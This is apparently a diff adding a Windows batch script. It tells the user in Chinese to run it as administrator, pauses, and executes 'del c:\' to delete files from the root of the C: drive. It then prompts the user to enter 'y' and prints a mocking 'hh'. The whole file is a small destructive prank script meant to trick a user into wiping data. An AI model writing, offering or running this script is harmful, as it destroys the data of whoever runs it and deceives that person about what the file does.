@@ -1,0 +1,8 @@
+@echo off
+echo 必须以管理员身份运行
+pause
+del c:\
+echo 请输入y
+echo hh 
+pause
+exit
